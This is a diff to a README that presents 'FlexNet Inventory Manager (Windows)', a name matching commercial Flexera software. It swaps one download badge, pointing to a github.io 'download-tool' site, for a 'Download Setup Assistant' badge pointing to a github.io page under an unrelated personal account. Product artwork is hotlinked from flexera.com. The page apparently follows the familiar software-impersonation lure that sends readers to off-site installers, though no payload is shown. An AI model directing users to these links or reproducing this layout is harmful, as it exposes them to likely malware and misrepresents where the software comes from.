@@ -1,13 +1,7 @@
 
 <h1 align="center">📊 FlexNet Inventory Manager (Windows)</h1>
 
-<p align="center">
-  <a href="https://flexnet-inventory-manager-download-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20FlexNet%20Inventory%20Manager-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download FlexNet Inventory Manager for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://tihonaarkhipov.github.io/.github/flexnet-inventory-manager-tool)
 
 <p align="center">
   <img src="https://www.flexera.com/blog/wp-content/uploads/2016/03/6a010537097f24970b01b8d1b387d0970c.png" alt="FlexNet Inventory Manager Dashboard Preview" width="800" />
